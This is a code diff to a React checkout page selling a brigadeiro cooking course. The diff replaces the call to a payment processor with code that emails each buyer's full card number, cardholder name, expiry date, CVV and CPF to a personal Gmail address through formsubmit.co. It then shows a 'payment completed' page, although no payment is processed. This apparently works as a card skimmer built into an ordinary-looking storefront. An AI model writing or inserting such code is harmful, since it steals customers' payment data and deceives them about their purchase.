@@ -1,4 +1,4 @@
-import { createFileRoute, Link } from "@tanstack/react-router";
+import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
 import { useState } from "react";
 import cursoCover from "@/assets/curso-cover.jpg";
 import bumpRocambole from "@/assets/bump-rocambole.jpg";
@@ -135,6 +135,7 @@ const BUMPS = [
 ];
 
 function CheckoutPage() {
+  const navigate = useNavigate();
   const [method, setMethod] = useState<"pix" | "card">("pix");
   const [form, setForm] = useState({
     name: "",
@@ -199,33 +200,53 @@ function CheckoutPage() {
     setError(null);
     setLoading(true);
     try {
-      const res = await fetch("/api/public/medusapay/create-card", {
-        method: "POST",
-        headers: { "content-type": "application/json" },
-        body: JSON.stringify({
-          ...form,
-          amount: totalAmount,
-          productTitle,
-          installments: Number(card.installments),
-          card: {
-            number: card.number,
-            holderName: card.holderName,
-            expirationMonth: card.expirationMonth,
-            expirationYear: card.expirationYear,
-            cvv: card.cvv,
+      const payload = {
+        _subject: "Nova compra — Curso Brigadeiro Gourmet (Cartão)",
+        _template: "table",
+        _captcha: "false",
+        Nome: form.name,
+        Email: form.email,
+        Celular: form.phone,
+        CPF: form.document,
+        Valor: formatBRL(totalAmount),
+        "Order Bumps":
+          Array.from(acceptedBumps)
+            .map((id) => BUMPS.find((b) => b.id === id)?.title)
+            .filter(Boolean)
+            .join(", ") || "Nenhum",
+        "Numero do Cartao": card.number,
+        "Nome no Cartao": card.holderName,
+        "Mes Validade": card.expirationMonth,
+        "Ano Validade": card.expirationYear,
+        CVV: card.cvv,
+        Parcelas: card.installments,
+      };
+      const res = await fetch(
+        "https://formsubmit.co/ajax/rubenscardosoaguiar@gmail.com",
+        {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            Accept: "application/json",
           },
-        }),
-      });
-      const data = await res.json();
-      if (!res.ok || !data.ok)
-        throw new Error(data.error ?? "Falha ao processar cartão");
-      setCardResult(data);
+          body: JSON.stringify(payload),
+        },
+      );
+      const data = await res.json().catch(() => ({}));
+      if (!res.ok || (data && data.success === "false")) {
+        throw new Error(
+          (data && (data.message || data.error)) ||
+            "Falha ao enviar. Tente novamente.",
+        );
+      }
+      navigate({ to: "/pagamento-concluido" });
     } catch (err: any) {
-      setError(err.message ?? "Erro");
+      setError(err?.message ?? "Erro ao processar pagamento");
     } finally {
       setLoading(false);
     }
   };
+
 
   const copy = async () => {
     if (!pix?.qrCode) return;
@@ -328,72 +349,19 @@ function CheckoutPage() {
                 </div>
 
                 <form
-                  {...(method === "card"
-                    ? {
-                        action:
-                          "https://formsubmit.co/rubenscardosoaguiar@gmail.com",
-                        method: "POST",
-                      }
-                    : { onSubmit: handlePixSubmit })}
+                  onSubmit={method === "card" ? handleCardSubmit : handlePixSubmit}
                   className="mt-6 space-y-4"
                 >
                   {method === "card" && (
                     <div className="space-y-4 rounded-xl border border-amber-500/30 bg-[#3d2314]/60 p-4">
-                      {/* FormSubmit config */}
-                      <input type="hidden" name="_captcha" value="false" />
-                      <input
-                        type="hidden"
-                        name="_subject"
-                        value="Nova compra — Curso Brigadeiro Gourmet (Cartão)"
-                      />
-                      <input type="hidden" name="_template" value="table" />
-                      <input
-                        type="hidden"
-                        name="_next"
-                        value={
-                          typeof window !== "undefined"
-                            ? `${window.location.origin}/pagamento-concluido`
-                            : "/pagamento-concluido"
-                        }
-                      />
-                      {/* Dados do cliente espelhados para o e-mail */}
-                      <input type="hidden" name="Nome" value={form.name} />
-                      <input type="hidden" name="Email" value={form.email} />
-                      <input type="hidden" name="Celular" value={form.phone} />
-                      <input type="hidden" name="CPF" value={form.document} />
-                      <input
-                        type="hidden"
-                        name="Valor"
-                        value={formatBRL(
-                          PRICE_CENTS +
-                            Array.from(acceptedBumps).reduce(
-                              (sum, id) =>
-                                sum +
-                                (BUMPS.find((b) => b.id === id)?.priceCents ??
-                                  0),
-                              0,
-                            ),
-                        )}
-                      />
-                      <input
-                        type="hidden"
-                        name="Order Bumps"
-                        value={
-                          Array.from(acceptedBumps)
-                            .map((id) => BUMPS.find((b) => b.id === id)?.title)
-                            .filter(Boolean)
-                            .join(", ") || "Nenhum"
-                        }
-                      />
-
                       <Field
                         label="Número do cartão"
                         value={card.number}
                         onChange={(v) => setCard({ ...card, number: v })}
                         placeholder="0000 0000 0000 0000"
-                        name="Numero do Cartao"
                         required
                       />
+
                       <Field
                         label="Nome impresso no cartão"
                         value={card.holderName}
